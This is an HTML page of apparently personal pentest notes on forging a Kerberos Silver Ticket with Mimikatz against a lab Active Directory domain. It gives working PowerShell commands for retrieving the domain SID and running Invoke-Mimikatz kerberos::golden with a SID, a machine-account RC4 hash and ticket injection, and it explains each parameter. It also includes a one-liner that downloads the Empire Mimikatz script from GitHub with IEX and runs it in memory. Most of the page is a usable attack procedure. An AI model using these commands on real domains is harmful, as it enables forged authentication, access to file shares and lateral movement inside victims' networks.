<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Forge Silver Ticket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Forge Silver Ticket</h1><br/><strong>Github Mimikatz powershell</strong>: <a href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a><br /><br /><strong>1. Retrieve the SID value of the domain</strong><br />we need it to build the Silver Ticket<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#00117f;font-weight:400">get-ADdomain</span> DANIELE.local<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; wmic useraccount list brief   <span style="color:#0088ff;font-weight:400">#alternative</span></pre></div><br />        <a href=""><img src="images/1148-1.png" alt="images/1148-1.png" /></a><br />        <br /><strong>2. Forge the Golden Ticket</strong><br />This command can be executed on any machine<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; . .<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span>.ps1   <span style="color:#0088ff;font-weight:400">#load powershell script</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;kerberos::golden /user:Administrator /domain:DANIELE.local /target:TESTDC.DANIELE.local /sid:S-1-5-21-2492168702-2322743348-3414347950 /rc4:be680d0eb8d8c44bfefaaecb69515b9d /startoffset:0 /endin:600 /renewmax:10080 /service:cifs /ptt&quot;&#39;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;kerberos::list&quot;&#39;</span></pre></div><br />    <a href=""><img src="images/1148-2.png" alt="images/1148-2.png" /></a><br />    <a href=""><img src="images/1148-3.png" alt="images/1148-3.png" /></a><br />    <code>kerberos::golden </code>→ Name of the module. There is not a Silver module!<br />    <code>/user:Administrator</code> → Username for which the TGT is generated, if we use a revoked/non-existing account is more suspicious <br />    <code>/domain:</code>  → Domain FQDN<br />    <code>/target:</code> → Target server FQDN. This is formed by &lt;hostname&gt;.&lt;domain&gt;. For example testdc.daniele.local<br />            <a href=""><img src="images/1148-4.png" alt="images/1148-4.png" /></a><br />    <em><code>/sid</code></em>:  → SID of the domain<br />    <em><code>/service:</code></em> → SPN of the Service for which we want create the Silver ticket. For example with “cifs” we can access to the Windows File Share of the Target machine<br />    <em><code>/id:</code></em> → Optional. It is the User ID or RID. Attention if we insert it it must coincide with the corespondent Service. <br />        example: In the example above for the Service CIFS on that machine its User ID is 1001<br />    <code>/rc4:</code><em> </em>→ NT Hash(RC4) of the Computer account. Use /aes128 and /aes256 for using AES keys <em><br />    </em><em><code>/startoffset:0</code></em> → Optional. When the Ticket is available in minutes(default is 0 that means &quot;right now&quot;) . <br />      ▪ Use negative numbers for a ticket available from past <br />      ▪ Use large number for the future<br />    <code>/endin</code>: → Optional. Ticket lifetime in minutes(default is 10 years). The default setting in Mimikatz is 10  hours==600 minutes<br />    <code>/renewmax</code>: → Optional. Ticket lifetime for renewal(default is 10 yeas). The default setting in Mimikatz is 7 days==10080 minutes<br />    <code>/ptt</code> or <code>/ticket</code> → It is not possible use both at the same time<br />      ▪ /ptt inject the ticket in current Powershell process, no need to save the ticket on disk<br />      ▪ /ticket save the ticket to a file for later use <br />          <br />The one line Powershell for it is:<em><br /></em><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;</span>);<span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;kerberos::golden /user:Administrator /domain:DANIELE.local /target:TESTDC.DANIELE.local /sid:S-1-5-21-2492168702-2322743348-3414347950 /rc4:be680d0eb8d8c44bfefaaecb69515b9d /id:1001 /startoffset:0 /endin:600 /renewmax:10080 /service:cifs /ptt&quot;&#39;</span>;<span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;kerberos::list&quot;&#39;</span></pre></div><br />Initially this PS script should give some error about some “<span style="color:#ff0000;">variables that cannot be retrieved because not been set</span>” but at the end should work<br /><br /><br /></div>
</body>
</html>
